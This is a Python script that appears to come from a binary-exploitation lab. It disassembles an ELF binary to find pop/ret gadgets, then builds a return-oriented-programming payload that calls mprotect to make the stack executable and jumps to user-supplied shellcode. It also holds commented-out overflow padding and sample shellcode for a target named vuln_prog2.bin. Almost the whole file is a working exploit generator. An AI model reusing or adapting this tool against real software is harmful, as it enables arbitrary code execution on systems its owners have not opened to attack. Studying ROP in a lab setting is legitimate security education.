# disas.py

import sys
from codecs import encode
import ast
from capstone import *
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
#filename= 'a.out'
filename = input("Input path of binary:")

#values for modified vuln_prog2.bin. You will have to find these values yourself:
'''
base of binary: 0x555555554000
address of mprotect: 0x7ffff7affc00
start of payload (264 A's included): 0x7fffffffe098
base of stack: 0x7fffffffe0b0
'''

disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args

# Helper Function
# Takes in string bytes and adds zeros until expectedLength
# Fixes leading zero issue when converting from bytes to integers, then back to bytes
def zerochecker(bytes, expectedLength):
    while len(bytes) != expectedLength:
        bytes = "0x0" + bytes[2:]
    return bytes

# Open ElF bin
with open(filename, 'rb') as file:
        elf = ELFFile(file)
        code = elf.get_section_by_name('.text')

        ops = code.data() # type bytes
        opslist = ops.split(b'\xc3')
        opslist_index = 0
        while opslist_index < len(opslist) - 1:
            opslist[opslist_index] += b'\xc3'
            opslist_index += 1

        addr = code['sh_addr'] # type int
        md = Cs(CS_ARCH_X86, CS_MODE_64)

        # gets all instructions, intended or not

        # want a list of byte arrays made from ops, split at returns (\xc3)
        # have addr etc for first one
        # for next call, increment addr by len of previous byte array

        # this while loop gets pop and ret instruction segments from capstone disas
        while(opslist != []):
            while (opslist[0] != b""):
                for (address, size, mnemonic, op_str) in md.disasm_lite(opslist[0], addr):
                    if ((mnemonic ==  "pop") or (mnemonic == "ret")):
                         disas.append((address,mnemonic,op_str))
                addr += 1
                opslist[0] = opslist[0][1:]
            opslist = opslist[1:]

# this while loop filters instruction segments to get useful gadgets
gadgets = []
gadgetIndex = 0
getOneRet = True
while gadgetIndex < len(disas):
        if ((disas[gadgetIndex][1] == 'ret') and getOneRet):
                gadgets.append((disas[gadgetIndex],))
                getOneRet = False
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret') and (disas[gadgetIndex+1][2] == ''):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret') and (disas[gadgetIndex+2][2] == ''):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2]))
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret') and (disas[gadgetIndex+3][2] == ''):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3]))
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret') and (disas[gadgetIndex+4][2] == ''):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4]))
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret') and (disas[gadgetIndex+5][2] == ''):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4],disas[gadgetIndex+5]))


        gadgetIndex = gadgetIndex + 1

#remove duplicates
gadgets.sort()
gadgetIndex = 1
while gadgetIndex < len(gadgets):
        #if lengths are different, gadgets must be different
        if len(gadgets[gadgetIndex]) != len(gadgets[gadgetIndex-1]):
                gadgetIndex+=1
                continue
        gadgetIndex2 = 0
        broke = False
        while gadgetIndex2 < (len(gadgets[gadgetIndex])-1):
                #if args of instructions are different, gadgets must be different
                if gadgets[gadgetIndex][gadgetIndex2][2] != gadgets[gadgetIndex-1][gadgetIndex2][2]:
                        gadgetIndex += 1
                        broke = True
                        break
                gadgetIndex2 += 1
        if(not broke):
                del gadgets[gadgetIndex]

print("Available Gadgets: ")
for i in gadgets:
        print(i)
print("Number of unique gadgets: " + str(len(gadgets)))

# finds the shortest length gadget for pop rdi, rsi, and rdx
# our filtering limits gadget size to 6, but we prefer smaller gadgets (2 is ideal, just pop reg and ret)
shortest_rdi = 100
shortest_rsi = 100
shortest_rdx = 100
rdi_addr = b""
rsi_addr = b""
rdx_addr = b""

for x in range(0, len(gadgets)):
    if (gadgets[x][0][2] == "rdi") and (len(gadgets[x]) < shortest_rdi):
        shortest_rdi = len(gadgets[x])
        rdi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
    elif (gadgets[x][0][2] == "rsi") and (len(gadgets[x]) < shortest_rsi):
        shortest_rsi = len(gadgets[x])
        rsi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
    elif (gadgets[x][0][2] == "rdx") and (len(gadgets[x]) < shortest_rdx):
        shortest_rdx = len(gadgets[x])
        rdx_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])

print("Length of shortest gadget to pop rdi = " + str(shortest_rdi))
print("Length of shortest gadget to pop rsi = " + str(shortest_rsi))
print("Length of shortest gadget to pop rdx = " + str(shortest_rdx))

# Exit if no gadgets found to pop rdi, rsi, and rdx
if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
    sys.exit("Unable to find necessary gadgets to build payload!")

# Obtain necessary inputs from the user
baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\": ")
addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
addressOfPayload = input("Input address of start of payload, including leading  \"0x\": ")
baseOfStack = input("Input address of the base of the stack, including leading  \"0x\": ")
fileForShellcode = input("Input path of file for shellcode input: ")
shellcodeFile = open(fileForShellcode,'r')
shellcodeTemp = shellcodeFile.read()

# hack to get shellcode from file properly
b = shellcodeTemp
c = bytearray(b, encoding='latin1')
shellcode = c.decode('unicode-escape').encode('ISO-8859-1')
shellcode = shellcode[:-2]
#shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"

#setup address of mprotect
faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
faddr_byte_array.reverse()

#setup base of stack
baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
baseOfStack_byte_array.reverse()


#calculations for args of mprotect
sizeOfStack = int(addressOfPayload, 16) - int(baseOfStack, 16)
sizeOfPayload = 72+8*3 + len(shellcode)
endOfStack = int(addressOfPayload, 16) - sizeOfPayload
startOfMprotect = endOfStack - endOfStack%4096
sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096
sizeOfMprotect += 4096-(sizeOfMprotect%4096)


rdi_addr.reverse()
rsi_addr.reverse()
rdx_addr.reverse()

#get gadget addresses ready (add offset from capstone to base of binary)
rdi_addr = bytearray.fromhex(hex(int.from_bytes(rdi_addr, 'little') + int(baseOfBinary, 16))[2:])
rsi_addr = bytearray.fromhex(hex(int.from_bytes(rsi_addr, 'little') + int(baseOfBinary, 16))[2:])
rdx_addr = bytearray.fromhex(hex(int.from_bytes(rdx_addr, 'little') + int(baseOfBinary, 16))[2:])

rdi_addr.reverse()
rsi_addr.reverse()
rdx_addr.reverse()

# start building ROP payload
garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00" #used if we need to pop multiple registers for gadgets
rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
rdi_arg.reverse()
rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
rsi_arg.reverse()
rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
mprotect_addr = faddr_byte_array

payload = rdi_addr + b"\x00\x00" + rdi_arg + garbage * (shortest_rdi - 2)
payload += rsi_addr + b"\x00\x00" + rsi_arg + garbage * (shortest_rsi - 2)
payload += rdx_addr + b"\x00\x00" + rdx_arg + garbage * (shortest_rdx - 2)
payload += mprotect_addr + b"\x00\x00"
shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
shellcode_addr.reverse()
payload += shellcode_addr + b"\x00\x00" + shellcode

#write payload to file
f = open('payload.txt', 'wb')
f.write(payload)

#below line contains padding needed to obtain control flow for vuln_prog2.bin
#f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+payload)
f.close()
